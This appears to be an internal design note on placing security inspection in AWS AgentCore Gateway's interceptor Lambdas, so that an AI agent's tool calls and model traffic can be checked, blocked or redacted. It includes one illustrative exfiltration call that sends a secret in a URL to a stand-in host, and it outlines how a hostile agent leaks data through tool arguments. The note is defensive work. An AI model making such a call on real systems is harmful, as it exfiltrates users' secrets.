# AgentCore Gateway interceptors — interposition spike

> Status: **Spike complete, GO.** Desk research against the AWS AgentCore
> Gateway docs (2026-08-20), no live account test yet. The one gating question
> — fail-open vs fail-closed — is **unanswered by the docs** and needs the PoC
> in `examples/agentcore-interceptor/` run against a real gateway before any of
> this is promised to a customer.

## The question

Can Containarium sit in the path of an agent that runs on Amazon Bedrock
AgentCore — inspecting what enters the agent's context and what leaves it —
*without* taking over the runtime?

If yes, the "we watch the ins and outs, AWS keeps the brain" position is real
and we can co-sell. If no, the only honest pitch is displacement.

## Answer: yes, on the Gateway-routed path

AgentCore Gateway supports **REQUEST** and **RESPONSE** interceptors: Lambda
functions invoked on *every gateway invocation*. They are a documented,
supported extension point — not a hack.

### What a REQUEST interceptor sees

The parsed JSON-RPC MCP body, before the gateway calls the target:

```json
{
  "interceptorInputVersion": "1.0",
  "mcp": {
    "gatewayRequest": {
      "path": "/mcp",
      "httpMethod": "POST",
      "body": {
        "jsonrpc": "2.0", "id": 1, "method": "tools/call",
        "params": { "name": "myTool", "arguments": {} }
      }
    }
  }
}
```

`params.name` and `params.arguments` are the tool call and its arguments. This
is the natural home for exfiltration checks — a hostile agent leaks through a
tool call's *arguments* (`http_get(url="evil.example?d=<secret>")`), not
through prose.

### It can hard-block

Returning a `transformedGatewayResponse` short-circuits the call:

> *"If the interceptor output contains a `transformedGatewayResponse`, the
> gateway will respond with that content immediately"* — and for HTTP targets,
> *"the gateway returns that response immediately without calling the target (a
> short-circuit)."*

That is a deny primitive we do not have to build.

### What a RESPONSE interceptor sees

`gatewayResponse.body` — the tool result — with the ability to rewrite it
before it reaches the caller. Redaction, stripping, annotation.

## Why this matters more than it looks: taint marking is free

The hardest gap in the gate design was **provenance**. At a model-call choke
point you get a flat `messages` array, and you cannot scan "the untrusted parts"
without knowing which spans came from a tool return versus the user's own
typing. Solving that needs agent-runtime cooperation — impossible for an agent
we do not control.

In the interceptor path the problem **dissolves**. Anything in a RESPONSE
interceptor's `gatewayResponse.body` *is* external tool output, structurally.
Provenance is a property of where the code runs, not something we have to infer.

This is the single most valuable finding of the spike.

## Model traffic is also in scope

Gateway is not only an MCP tool gateway. Per the service overview it

> *"routes inference requests across multiple model providers through a
> unified, model-based routing endpoint."*

Inference targets use the `http` interceptor payload (base64-encoded bodies),
and AWS's own documented example decodes that body and rewrites `payload["model"]`
after reading `payload["input"]`. So on a Gateway-routed inference path a
REQUEST interceptor sees the prompt and a RESPONSE interceptor sees the
completion.

**Caveat:** this exists only if the customer routes inference *through* Gateway
rather than calling Bedrock directly. It is a configuration-dependent control,
not a structural one. See "What this does not cover".

## Constraints

| Constraint | Consequence |
| --- | --- |
| Interceptors are **Lambda-only** | Our inspection engine ships as a Lambda, or the Lambda thin-proxies to it. Latency on every tool call; the proxy hop must be reachable. |
| **One REQUEST + one RESPONSE per gateway** | AWS itself recommends an interceptor for private IdP auth. If the customer already has one, we must own it and chain — a support burden, not a blocker. |
| **6 MB Lambda payload cap** (request + response combined) | Docs note this is *"common with inference models"* and suggest a payload filter excluding `RESPONSE_BODY`. **Excluding the body makes DLP on that body impossible.** Large completions are a real blind spot. |
| **HTTP-target interceptors: buffered only** | Inference streaming is not yet supported. MCP streaming *is* (one invocation per event; only the first may change headers/status). |
| Gateway **may retry** interceptors | Inspection must be idempotent. |
| Runs in the **customer's** AWS account | We ship a package + config, not a hosted service. The customer can disable it. Audit events must be shipped out to our plane to be tamper-evident. |

### Open question (gating)

**The docs do not state whether the gateway fails open or closed when an
interceptor Lambda errors or times out.** A control that fails open on timeout
is not a control. Settle this empirically with the PoC before it appears on any
customer-facing material.

## What this does not cover

- **Tools called directly by the agent.** The agent has its own HTTP client and
  network egress. Anything not routed through Gateway is invisible here.
- **The microVM's own egress.** Still needs AgentCore VPC mode plus security
  groups. There is no kernel we own, so no eBPF.

The VPC egress appliance therefore remains necessary — but as a *complementary
backstop* rather than the whole mechanism. Interceptors give semantic control
on the routed path; the appliance catches the unrouted path. That is a better
architecture than either alone, and a more honest slide.

## Three placements, revisited

| | Placement | Choke point | Built |
| --- | --- | --- | --- |
| **A** | Wrap AgentCore via interceptors | Gateway REQUEST/RESPONSE | Now tractable |
| **B** | Agent runs in a Containarium box | `internal/modelgateway` | ~60–70% |
| **C** | Box as the AgentCore **control plane** | Box egress + operator surface | New — see below |

### Placement C — `agentcore-cli` inside the box

Install AWS's `@aws/agentcore` CLI *inside* a Containarium box and drive it from
there. The AgentCore runtime stays AWS's; the **operator surface** becomes ours.

This is the same shape as `docs/integrations/pi.md` — run the agent inside the
box — applied to AWS's toolchain instead of an agent.

What it buys:

- **Every `agentcore deploy` / `invoke` is a `shell_exec`** through `agent-box`,
  so the deploy and invoke path is auditable by construction.
- **AWS credentials live in Containarium secrets** (`/run/secrets`, tmpfs, 0440)
  rather than on a laptop or in CI.
- **The invoke path crosses our egress**, so eBPF netpolicy and the Tier-3 WAF
  apply to it. This is the ingress interposition that was listed as gap C2 — it
  comes free when the caller lives in our box.
- The box is where the interceptor Lambda gets built, deployed, and registered.

Practical notes:

- `agentcore deploy` builds **remotely via CodeBuild** and pushes to ECR, so it
  needs no local container runtime. This path should work in a plain LXC box.
- `agentcore dev` runs containers locally with source mounted at `/app`. Nested
  containers in an LXC box are historically fragile here (cf. kind, which cannot
  run nested — `/dev/kmsg` is blocked). **Assume `dev` does not work until
  tested**; the recipe does not promise it.
- The CLI takes the `agentcore` command name and collides with the older Python
  `bedrock-agentcore-starter-toolkit`. Not an issue on a fresh box.

Recipe: `agentcore-cli` in `pkg/core/recipes/recipes.yaml`.

## Revised gap list

| Gap | Before | After |
| --- | --- | --- |
| I1 inspection hook | S | **Provided by AWS** |
| I2 taint marking | **L — blocker** | **Dissolved** |
| I4 verdict / block | M | **Provided** (short-circuit) |
| O2 action interception | M | **Provided** for gateway-routed tools |
| O3 tool-argument inspection | M | **Directly available** |
| Lambda packaging of the inspection engine | — | New, M |
| Interceptor → audit hash-chain shipping | — | New, M |
| Payload-limit / streaming strategy | — | New, M |
| Interceptor conflict + chaining | — | New, S |
| **Fail-closed verification** | — | New, S — **gating** |

Unchanged and still required: DLP engine (O1), non-OpenAI output shapes (O4),
SNI egress enforcement (E1), ENFORCE-mode rollout (E2), agent-semantic audit
events (A1).

## Honest framing for the pitch

Interceptors only see what is routed **through** the Gateway. The claim is
*"adopt the Gateway-routed architecture and we secure it"* — not *"we secure
AgentCore"*. Said plainly this is a strength: it gives AWS a reason to like us,
because it pushes customers toward Gateway adoption.

Note also, from `docs/AGENT-DATA-PLANE-SEPARATION-DESIGN.md`, that the eBPF
egress allowlist *cannot* be the last line against exfiltration to the model
provider — the provider endpoint is on the allowlist by necessity. Only content
inspection closes that. The three layers are not redundant; they cover different
holes, and saying so is more persuasive than claiming any one of them is
complete.

## Next steps

1. Run `examples/agentcore-interceptor/` against a real gateway. **Answer the
   fail-open question first.**
2. Measure added latency per tool call and per inference call.
3. Decide the payload-cap strategy for large completions.
4. Only then put numbers or promises on customer-facing material.

## See also

- `docs/AGENT-DATA-PLANE-SEPARATION-DESIGN.md` — the choke-point argument and
  the allowed-endpoint exfil hole.
- `docs/integrations/pi.md` — the run-the-agent-inside-the-box precedent.
- `examples/agentcore-interceptor/` — the PoC Lambda.
